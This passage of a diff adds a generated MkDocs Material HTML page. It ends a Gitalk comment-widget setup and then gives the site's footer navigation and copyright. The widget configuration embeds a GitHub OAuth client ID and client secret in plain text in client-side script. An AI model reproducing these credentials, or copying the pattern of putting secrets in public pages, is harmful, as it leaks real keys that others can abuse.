+        clientID: '3723c7324ba2e721d768',
+        clientSecret: '258669b5f96c0bb0d7c8460b2c272cf9cd3616fa',
+        repo: 'comment',
+        owner: 'beafb1b1',
+        admin: ['beafb1b1'],
+        id: md5(location.pathname),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid">
+        
+          <a href="../../blockchain/email_bot/" title="email bot" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-back md-footer-nav__button"></i>
+            </div>
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Previous
+                </span>
+                email bot
+              </span>
+            </div>
+          </a>
+        
+        
+          <a href="../gitpage_fuck/" title="gitpage采坑" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+              <span class="md-flex__ellipsis">
+                <span class="md-footer-nav__direction">
+                  Next
+                </span>
+                gitpage采坑
+              </span>
+            </div>
+            <div class="md-flex__cell md-flex__cell--shrink">
+              <i class="md-icon md-icon--arrow-forward md-footer-nav__button"></i>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            Copyright &copy; b1b1@r3kapig
+          </div>
+        
+        powered by
+        <a href="https://www.mkdocs.org">MkDocs</a>
+        and
+        <a href="https://squidfunk.github.io/mkdocs-material/">
+          Material for MkDocs</a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/application.c648116f.js"></script>
+      
+      <script>app.initialize({version:"1.0.4",url:{base:"../.."}})</script>
+      
+    
+  </body>
+</html>
